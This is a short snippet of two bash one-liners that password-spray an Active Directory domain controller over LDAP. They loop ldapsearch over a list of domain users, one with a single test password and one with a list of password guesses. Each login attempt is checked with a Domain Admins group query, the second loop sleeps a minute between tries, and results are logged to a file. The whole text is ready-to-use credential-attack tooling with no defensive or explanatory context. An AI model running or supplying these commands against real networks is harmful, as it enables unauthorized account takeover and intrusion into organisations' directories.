$while read m; do echo "$m@example.com"; ldapsearch -x -z 2 -h <DC_IP> -D "$m@example.com" -w "<Test_Password>" -b "dc=example,dc=com" "(&(objectCategory=group)(sAMAccountName=Domain Admins))" cn 2>/dev/null; done < list_of_domain-users.txt | tee -a output_ldapsearch_password-spray.txt

$while read password; do while read user; do echo "$user@example.com"; ldapsearch -x -z 2 -h <DC_IP> -D "$user@example.com" -w "$password" -b "dc=example,dc=com" "(&(objectCategory=group)(sAMAccountName=Domain Admins))" cn 2>/dev/null; sleep 1m; done < list_of_domain-users.txt; done < list_password_guesses.txt | tee -a output_ldapsearch_password-spray.txt
